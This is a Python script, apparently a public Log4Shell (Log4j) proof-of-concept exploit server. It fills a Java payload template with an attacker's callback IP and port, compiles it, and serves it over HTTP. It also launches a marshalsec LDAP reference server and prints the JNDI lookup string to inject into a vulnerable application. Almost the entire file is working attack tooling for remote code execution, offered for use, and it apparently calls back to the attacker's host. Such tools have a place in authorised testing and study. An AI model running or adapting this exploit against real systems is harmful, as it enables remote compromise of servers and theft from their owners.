import threading
import subprocess
from functools import partial
import sys
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pwn import *



log.info("Log4Shell POC server")
log.info("By: serialwaffle")
log.info("https://github.com/serialwaffle/l4j_server")

if len(sys.argv) != 3:
	log.info("Duh, your not using me right....")
	print("\n python3 log4j_server.py <callback_ip:callback_port> <HTTP_server_port> \n")
	exit()


try:
	lsocket = sys.argv[1] 
	webport = sys.argv[2]
	lport = lsocket.split(":",1)[1]
	lip = lsocket.split(":",1)[0]
	log.info("Exploit Exploit calling back to: "+lip+":"+lport)
	log.info("HTTP Listener on : "+webport)
except:
	log.info("Duh, your not using me right....")
	print("\n python3 log4j_Server.py <callback_ip:callback_port> <HTTP_server_port> \n")
	exit()


payload_path = "share/payload.java"
javac_path = "jdk1.8.0_202/bin/javac"
java_path = "jdk1.8.0_202/bin/java"
marshal_path = "marshalsec-0.0.3-SNAPSHOT-all.jar"
marshal_bin = "marshalsec.jndi.LDAPRefServer"


def make_payload():
	payload_orig = open('payload_template','r')
	copy = open(payload_path,'w')
	for line in payload_orig:
		if "<ip>" in line:
			line =line.replace("<ip>",lip)
		if "<port>" in line:
			line = line.replace("<port>",lport)
		copy.write(line)
	payload_orig.close()
	copy.close()

	#compile Exploit
	try:
		subprocess.run([javac_path, payload_path])
		log.info("Payload created")
	except:
		print("didn't work")
		exit()

def HTTPSvr():
    log.info("Starting Webserver on port %s  http://0.0.0.0:%s"%(webport,webport))
    handler = partial(SimpleHTTPRequestHandler, directory="share")
    httpd = HTTPServer(('0.0.0.0', int(webport)), handler)
    httpd.serve_forever()

def LDAPSvr():
	exploit = "${jndi:ldap://%s:1389/a}"%(lip)
	log.info("*****EXPLOIT****")
	print("\n\n"+exploit+"\n\n")
	url = ("http://%s:%s/#payload")%(lip,webport)
	subprocess.run([java_path,"-cp",marshal_path,marshal_bin,url,])



def main():
	make_payload()
	tLDAP = threading.Thread(target=LDAPSvr,args=())
	tLDAP.start()
	HTTPSvr()
	


if "__main__" in __name__:
	main()




